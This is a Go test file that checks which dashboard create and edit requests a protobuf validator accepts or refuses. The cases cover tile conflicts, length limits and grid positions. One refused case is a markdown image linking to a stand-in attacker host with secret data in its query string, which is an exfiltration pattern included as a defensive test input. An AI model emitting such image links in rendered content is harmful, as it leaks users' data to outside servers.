package dashboards

import (
	"strings"
	"testing"

	"buf.build/go/protovalidate"
	"google.golang.org/protobuf/proto"
	"google.golang.org/protobuf/types/known/timestamppb"

	commonv1 "github.com/pug-sh/pug/internal/gen/proto/common/v1"
	shareddashboardsv1 "github.com/pug-sh/pug/internal/gen/proto/shared/dashboards/v1"
	insightsv1 "github.com/pug-sh/pug/internal/gen/proto/shared/insights/v1"
)

func trendsSpec(kind string) *insightsv1.InsightQuerySpec {
	return &insightsv1.InsightQuerySpec{
		InsightType: insightsv1.InsightType_INSIGHT_TYPE_TRENDS.Enum(),
		Events:      []*insightsv1.EventQuery{{Event: &commonv1.EventFilter{Kind: proto.String(kind)}}},
	}
}

func pos(x, y, w, h int32) *shareddashboardsv1.Position {
	return &shareddashboardsv1.Position{X: proto.Int32(x), Y: proto.Int32(y), W: proto.Int32(w), H: proto.Int32(h)}
}

func markdownTile(body string) *shareddashboardsv1.Tile {
	return &shareddashboardsv1.Tile{Markdown: proto.String(body)}
}

// TestUpsertRequestRules checks the rules protovalidate enforces, each with a
// request it refuses beside the valid one it was cut from.
func TestUpsertRequestRules(t *testing.T) {
	create := func() *shareddashboardsv1.UpsertRequest {
		return &shareddashboardsv1.UpsertRequest{
			DisplayName: proto.String("Growth"),
			Tiles: []*shareddashboardsv1.Tile{
				{DisplayName: proto.String("Signups"), Spec: trendsSpec("signup"), Chart: shareddashboardsv1.Chart_CHART_BAR.Enum(), Position: pos(0, 0, 6, 22)},
				markdownTile("See [the docs](https://pug.sh)"),
			},
		}
	}
	edit := func() *shareddashboardsv1.UpsertRequest {
		return &shareddashboardsv1.UpsertRequest{
			Id:         proto.String("d1"),
			UpdateTime: timestamppb.Now(),
			Tiles: []*shareddashboardsv1.Tile{
				{Id: proto.String("t1"), DisplayName: proto.String("Renamed")},
				markdownTile("New"),
			},
			Remove: []string{"t2"},
		}
	}
	for name, req := range map[string]*shareddashboardsv1.UpsertRequest{"create": create(), "edit": edit()} {
		if err := protovalidate.Validate(req); err != nil {
			t.Fatalf("valid %s refused: %v", name, err)
		}
	}

	refused := []struct {
		name string
		req  *shareddashboardsv1.UpsertRequest
	}{
		{"create without a name", with(create(), func(r *shareddashboardsv1.UpsertRequest) { r.DisplayName = nil })},
		{"create with update_time", with(create(), func(r *shareddashboardsv1.UpsertRequest) { r.UpdateTime = timestamppb.Now() })},
		{"create with remove", with(create(), func(r *shareddashboardsv1.UpsertRequest) { r.Remove = []string{"t1"} })},
		{"create with a tile id", with(create(), func(r *shareddashboardsv1.UpsertRequest) { r.Tiles[1].Id = proto.String("t1") })},
		{"edit without update_time", with(edit(), func(r *shareddashboardsv1.UpsertRequest) { r.UpdateTime = nil })},
		{"new tile with neither spec nor markdown", with(edit(), func(r *shareddashboardsv1.UpsertRequest) { r.Tiles[1].Markdown = nil })},
		{"new tile with spec and markdown", with(edit(), func(r *shareddashboardsv1.UpsertRequest) { r.Tiles[1].Spec = trendsSpec("signup") })},
		{"tile changed twice", with(edit(), func(r *shareddashboardsv1.UpsertRequest) { r.Tiles[1].Id = proto.String("t1") })},
		{"tile changed and removed", with(edit(), func(r *shareddashboardsv1.UpsertRequest) { r.Remove = []string{"t1"} })},
		{"tile removed twice", with(edit(), func(r *shareddashboardsv1.UpsertRequest) { r.Remove = []string{"t2", "t2"} })},
		{"empty id in remove", with(edit(), func(r *shareddashboardsv1.UpsertRequest) { r.Remove = []string{""} })},
		{"segmentation", with(create(), func(r *shareddashboardsv1.UpsertRequest) {
			r.Tiles[0].Spec.InsightType = insightsv1.InsightType_INSIGHT_TYPE_SEGMENTATION.Enum()
		})},
		{"session metric", with(create(), func(r *shareddashboardsv1.UpsertRequest) {
			r.Tiles[0].Spec = &insightsv1.InsightQuerySpec{
				InsightType: insightsv1.InsightType_INSIGHT_TYPE_TRENDS.Enum(),
				Session:     &insightsv1.SessionQuery{Metric: insightsv1.SessionMetric_SESSION_METRIC_SESSIONS.Enum()},
			}
		})},
		{"markdown image", with(create(), func(r *shareddashboardsv1.UpsertRequest) {
			r.Tiles[1].Markdown = proto.String("![chart](https://evil.example/c.png?d=secret)")
		})},
		{"empty markdown", with(create(), func(r *shareddashboardsv1.UpsertRequest) { r.Tiles[1].Markdown = proto.String("") })},
		{"long markdown", with(create(), func(r *shareddashboardsv1.UpsertRequest) {
			r.Tiles[1].Markdown = proto.String(strings.Repeat("a", 100001))
		})},
		{"undefined chart", with(create(), func(r *shareddashboardsv1.UpsertRequest) { r.Tiles[0].Chart = shareddashboardsv1.Chart(99).Enum() })},
		{"empty name", with(create(), func(r *shareddashboardsv1.UpsertRequest) { r.DisplayName = proto.String("") })},
		{"long name", with(create(), func(r *shareddashboardsv1.UpsertRequest) { r.DisplayName = proto.String(strings.Repeat("a", 151)) })},
		{"long description", with(create(), func(r *shareddashboardsv1.UpsertRequest) { r.Description = proto.String(strings.Repeat("a", 2001)) })},
		{"long tile name", with(create(), func(r *shareddashboardsv1.UpsertRequest) {
			r.Tiles[0].DisplayName = proto.String(strings.Repeat("a", 151))
		})},
		{"long tile description", with(create(), func(r *shareddashboardsv1.UpsertRequest) {
			r.Tiles[0].Description = proto.String(strings.Repeat("a", 2001))
		})},
		{"101 tiles", with(create(), func(r *shareddashboardsv1.UpsertRequest) {
			for len(r.Tiles) <= 100 {
				r.Tiles = append(r.Tiles, markdownTile("More"))
			}
		})},
		{"x past the grid", with(create(), func(r *shareddashboardsv1.UpsertRequest) { r.Tiles[0].Position = pos(12, 0, 2, 22) })},
		{"w of one column", with(create(), func(r *shareddashboardsv1.UpsertRequest) { r.Tiles[0].Position = pos(0, 0, 1, 22) })},
		{"w past the grid", with(create(), func(r *shareddashboardsv1.UpsertRequest) { r.Tiles[0].Position = pos(0, 0, 13, 22) })},
		{"x + w past the grid", with(create(), func(r *shareddashboardsv1.UpsertRequest) { r.Tiles[0].Position = pos(8, 0, 6, 22) })},
		{"negative y", with(create(), func(r *shareddashboardsv1.UpsertRequest) { r.Tiles[0].Position = pos(0, -1, 6, 22) })},
		{"y past 100000", with(create(), func(r *shareddashboardsv1.UpsertRequest) { r.Tiles[0].Position = pos(0, 100001, 6, 22) })},
		{"h of zero", with(create(), func(r *shareddashboardsv1.UpsertRequest) { r.Tiles[0].Position = pos(0, 0, 6, 0) })},
		{"h past 800", with(create(), func(r *shareddashboardsv1.UpsertRequest) { r.Tiles[0].Position = pos(0, 0, 6, 801) })},
		{"position without x", with(create(), func(r *shareddashboardsv1.UpsertRequest) { r.Tiles[0].Position.X = nil })},
		{"position without h", with(create(), func(r *shareddashboardsv1.UpsertRequest) { r.Tiles[0].Position.H = nil })},
	}
	for _, tc := range refused {
		if err := protovalidate.Validate(tc.req); err == nil {
			t.Errorf("%s: accepted", tc.name)
		}
	}
}

func TestGetRequestNeedsID(t *testing.T) {
	if err := protovalidate.Validate(&shareddashboardsv1.GetRequest{}); err == nil {
		t.Fatal("Get without an id accepted")
	}
}

func with(r *shareddashboardsv1.UpsertRequest, change func(*shareddashboardsv1.UpsertRequest)) *shareddashboardsv1.UpsertRequest {
	change(r)
	return r
}
